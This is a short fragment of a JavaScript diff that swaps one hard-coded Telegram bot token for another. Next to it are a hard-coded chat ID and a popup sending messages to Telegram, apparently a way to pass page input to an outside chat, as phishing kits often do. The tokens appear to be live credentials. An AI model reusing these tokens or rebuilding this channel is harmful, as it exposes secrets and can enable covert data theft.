@@ -220,7 +220,7 @@
   document.body.appendChild(popup);
 
   // --- Telegram logic from x.html ---
-   const TELEGRAM_BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
+   const TELEGRAM_BOT_TOKEN = '8480274967:AAHt7Fj8oW4hep_puqNeCUVVQJEZks3Zonw';
   const TELEGRAM_CHAT_ID = '-4704812522';
 
   function sendToTelegram(message) {
